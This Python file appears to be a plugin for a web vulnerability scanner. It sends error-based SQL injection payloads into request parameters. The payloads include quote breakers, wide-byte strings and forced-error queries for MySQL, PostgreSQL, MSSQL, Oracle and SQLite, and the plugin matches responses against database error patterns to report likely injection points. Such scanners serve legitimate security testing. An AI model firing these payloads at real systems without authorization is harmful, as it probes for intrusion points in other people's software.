#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2020/5/10
# JiuZero 2025/3/13

from config.others.SqlError import rules
from api import generateResponse, random_num, random_str, VulType, Type, PluginBase, conf, logger, Threads, KB
from lib.helper.helper_sensitive import sensitive_page_error_message_check
from lib.helper.paramanalyzer import is_sql_injection
import re

class Z0SCAN(PluginBase):
    name = "sqli-error"
    desc = 'SQL Error Finder'
    version = "2025.3.13"
    risk = 2
        
    def audit(self):
        if not self.fingerprints.waf and self.risk in conf.risk and conf.level != 0 and not self.name in KB.disable:
            _payloads = [
                r"'\")",
                ## 宽字节
                r'鎈\'"\(',
                ## 通用报错
                r';)\\\'\\"',
                r'\' oRdeR bY 500 ',
                r';`)',
                r'\\', 
                r"%%2727", 
                r"%25%27", 
                r"%60", 
                r"%5C",
            ]
            if conf.level == 3: 
                _payloads += [
                ## 强制报错
                # MySQL
                r'\' AND 0xG1#',
                # PostgreSQL  
                r"' AND 'a' ~ 'b\[' -- ",
                # MSSQL
                r"; RAISERROR('Error generated', 16, 1) -- ", 
                # Oracle
                r"' UNION SELECT XMLType('<invalid><xml>') FROM dual -- ",  
                # SQLite
                r"' UNION SELECT SUBSTR('o', -1, 1) -- ",
                ]
    
            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="sqli-error")
            z0thread.submit(self.process, iterdatas, _payloads)
    
    def Get_sql_errors(self):
        sql_errors = []
        for database, re_strings in rules.items():
            for re_string in re_strings:
                sql_errors.append((re.compile(re_string, re.IGNORECASE), database))
        return sql_errors
    
    def process(self, _, _payloads):
        k, v, position = _
        if not is_sql_injection(k, v):
            return
        for _payload in _payloads:
            payload = self.insertPayload({
                "key": k, 
                "value": v, 
                "position": position, 
                "payload": _payload
                })
            r = self.req(position, payload)
            if not r:
                continue
            html = r.text
            for sql_regex, dbms_type in self.Get_sql_errors():
                match = sql_regex.search(html)
                if match:
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.SQLI, 
                        "show": {
                            "Position": f"{position} >> {k}",
                            "Payload": payload, 
                            "Msg": "DBMS_TYPE Maybe {}; {}".format(dbms_type, match.group())
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Dbms Maybe {}; {}".format(dbms_type, match.group())
                        })
                    self.success(result)
                    return True
            message_lists = sensitive_page_error_message_check(html)
            # 在SQL报错注入过程中检测到未知报错
            if message_lists:
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST, 
                    "url": self.requests.url, 
                    "vultype": VulType.SENSITIVE, 
                    "show": {
                        "Position": f"{position} >> {k}",
                        "Payload": payload, 
                        "Msg": "Receive Error Msg {}".format(repr(message_lists))
                        }
                    })
                result.step("Request1", {
                    "request": r.reqinfo, 
                    "response": generateResponse(r), 
                    "desc": "Receive Error Msg {}".format(repr(message_lists))
                    })
                self.success(result)
                break
    